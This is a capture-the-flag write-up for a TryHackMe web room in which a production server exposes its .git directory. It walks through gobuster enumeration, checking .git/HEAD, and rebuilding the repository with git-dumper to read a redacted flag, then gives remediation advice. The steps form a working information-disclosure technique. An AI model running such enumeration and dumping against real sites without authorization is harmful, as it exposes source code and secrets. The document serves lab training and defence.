# Hacker Holidays: Day 2 - Room 404

> 📝 **Write-up credit:** Based on the English write-up by [`shelvy1337` (Cybersecurity-Writeups)](https://github.com/shelvy1337/Cybersecurity-Writeups/tree/main/TryHackMe/Hacker%20Holidays%202026) and used with attribution per that repository's terms. Flag values are censored as `THM{REDACTED}` per this repository's convention.

---

> Room 404 was not hidden behind complex application logic. The issue was a classic deployment mistake: the `.git` directory was exposed on the production web server, making it possible to reconstruct the source code and read internal staging notes.

## Quick Overview

| Field | Value |
| --- | --- |
| Platform | TryHackMe |
| Event | Hacker Holidays 2026 |
| Day | 2 |
| Category | Web |
| Difficulty | Very Easy |
| Techniques | Directory Enumeration, Information Disclosure, Exposed Git Repository |
| Target | `http://MACHINE_IP:8080` |

## Objective

The goal was to dump the exposed source code and find the flag. The challenge description strongly hinted that the developer had deployed more than just the website:

```text
The Byte Lotus guest-experience platform went live in a hurry,
and the night-shift developer shipped more than the website.
```

That pointed toward developer files or directories that should never have been publicly accessible.

## Attack Path

1. I opened the application on port `8080`.
2. I performed directory enumeration.
3. I manually checked common paths left behind by version control systems.
4. I confirmed that the `.git` directory was publicly accessible.
5. I dumped the repository with `git-dumper`.
6. I reviewed the source files and found the flag in `README.md`.

## Recon

After starting the machine, the application was available at:

```text
http://MACHINE_IP:8080
```

The first step was to check the server response:

```bash
curl -i http://MACHINE_IP:8080
```

The site was working, but the room description made it clear that the interesting part was something not directly linked from the page. I moved on to directory enumeration:

```bash
gobuster dir -u http://MACHINE_IP:8080 -w /usr/share/wordlists/dirb/common.txt
```

For this kind of challenge, it is also worth manually checking common paths that are often deployed by mistake:

```text
/.git/
/.svn/
/.hg/
/.env
```

In this case, the important path was:

```text
http://MACHINE_IP:8080/.git/
```

The `.git` directory was reachable from the browser, which meant the repository could likely be reconstructed.

## Confirming The Issue

Opening `.git/` exposed the Git repository structure. The `HEAD` file could also be checked directly:

```bash
curl http://MACHINE_IP:8080/.git/HEAD
```

Example response:

```text
ref: refs/heads/main
```

This confirms that the web server is exposing Git metadata, not just the public site. Reading Git objects manually is inconvenient because many of them are stored as zlib-compressed objects. Reconstructing the full repository locally is much faster.

## Dumping The Repository

I used `git-dumper` to download the exposed repository.

If the tool is not installed yet:

```bash
python3 -m pip install git-dumper
```

Then dump the repository:

```bash
python3 -m git_dumper http://MACHINE_IP:8080/.git/ dumped_repo
```

Alternatively, if the command is available directly:

```bash
git-dumper http://MACHINE_IP:8080/.git/ dumped_repo
```

After the dump finishes, move into the reconstructed directory:

```bash
cd dumped_repo
ls -la
```

The repository contained files such as:

- `app.js`
- `index.html`
- `README.md`

## Source Code Analysis

The most interesting file was `README.md`, which contained internal staging notes:

```bash
cat README.md
```

The file stated that this folder should not have been deployed:

```text
# Byte Lotus - Guest Experience Platform
Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.
Staging flag (remove before launch): THM{...}
```

The flag had been left inside repository documentation that became publicly accessible due to the deployment misconfiguration.

## Flag

After reading `README.md` and submitting the value from the staging line, the answer is accepted:

**Flag:** `THM{REDACTED}`

## Why It Works

The `.git` directory stores the full repository structure and history: references, the index, objects, and metadata needed by Git to reconstruct the project files. If that directory is exposed over HTTP, an attacker can fetch the objects and rebuild the source code offline.

In this challenge, the weakness was not in the application logic itself, but in the deployment configuration. A developer directory containing internal notes and the staging flag was shipped with the website.

## How To Fix It

- Never deploy `.git`, `.svn`, `.hg`, or other version control directories.
- Block access to hidden files and directories at the web server level.
- Use a build and deployment process that publishes only the required artifacts.
- Do not store secrets, flags, or operational notes in a repository served by the web application.
- Add CI/CD checks that detect exposed developer directories before deployment.

## Summary

Day 2 of Hacker Holidays 2026 is a classic information disclosure challenge caused by an exposed `.git` directory. The path was simple: find the hidden directory, dump the repository, and read the staging documentation.

The core idea: directory enumeration, confirm `.git/`, dump the repository, and read `README.md`.
